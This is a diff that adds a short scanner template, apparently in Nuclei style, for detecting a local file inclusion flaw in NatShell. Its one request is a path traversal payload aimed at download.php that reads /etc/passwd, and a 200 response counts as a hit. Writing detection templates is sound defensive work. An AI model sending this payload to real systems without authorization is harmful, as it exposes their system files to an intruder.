@@ -1,0 +1,19 @@
+id: natshell-path-traversal
+brief:
+    title: NatShell - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: NatShell is vulnerable to local file inclusion.
+    label:
+        - natshell
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/download.php?file=../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
